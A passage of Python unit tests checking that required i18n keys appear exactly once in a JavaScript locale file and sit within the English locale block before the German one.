    def test_keys_only_added_to_english_locale(self):
        for key in self.REQUIRED_KEYS:
            count = I18N_JS.count(f"{key}:")
            assert count == 1, f"i18n key '{key}' found {count} times — expected exactly 1 (en only)"

    def test_keys_precede_de_locale_block(self):
        en_start = I18N_JS.find("\n  en: {")
        de_start = I18N_JS.find("\n  de: {")
        assert en_start >= 0 and de_start > en_start
        for key in self.REQUIRED_KEYS:
            key_idx = I18N_JS.find(f"{key}:")
            assert en_start < key_idx < de_start, f"'{key}' must be inside LOCALES.en"
